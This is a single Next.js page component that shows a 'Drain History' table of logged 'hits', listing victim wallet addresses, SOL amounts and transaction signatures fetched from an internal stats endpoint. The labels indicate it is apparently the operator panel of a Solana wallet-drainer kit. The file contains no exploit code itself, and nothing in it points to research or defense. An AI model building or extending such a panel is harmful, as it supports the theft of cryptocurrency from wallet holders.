// src/app/hits/page.js
'use client';

import { useState, useEffect } from 'react';

export default function HitsPage() {
    const [hits, setHits] = useState([]);

    useEffect(() => {
        fetch('/api/stats')
            .then(res => res.json())
            .then(data => {
                if (data.success) setHits(data.hits || []);
            });
    }, []);

    return (
        <div className="min-h-screen bg-slate-900 text-white p-8">
            <h1 className="text-3xl font-bold mb-6 text-blue-400">Drain History</h1>
            
            <div className="bg-slate-800 rounded-lg overflow-hidden">
                <table className="w-full text-left border-collapse">
                    <thead className="bg-slate-700 text-slate-200">
                        <tr>
                            <th className="p-4">Time</th>
                            <th className="p-4">Wallet</th>
                            <th className="p-4">Amount (SOL)</th>
                            <th className="p-4">Signature</th>
                        </tr>
                    </thead>
                    <tbody className="divide-y divide-slate-700">
                        {hits.length === 0 ? (
                            <tr>
                                <td colSpan="4" className="p-4 text-center text-slate-400">No hits logged yet.</td>
                            </tr>
                        ) : (
                            hits.map((hit, index) => (
                                <tr key={index} className="hover:bg-slate-700/50">
                                    <td className="p-4 text-sm text-slate-400">{new Date(hit.timestamp).toLocaleString()}</td>
                                    <td className="p-4 font-mono text-emerald-400">{hit.wallet}</td>
                                    <td className="p-4 font-bold">{hit.amount}</td>
                                    <td className="p-4 text-xs font-mono text-blue-300 break-all">{hit.signature}</td>
                                </tr>
                            ))
                        )}
                    </tbody>
                </table>
            </div>
        </div>
    );
}
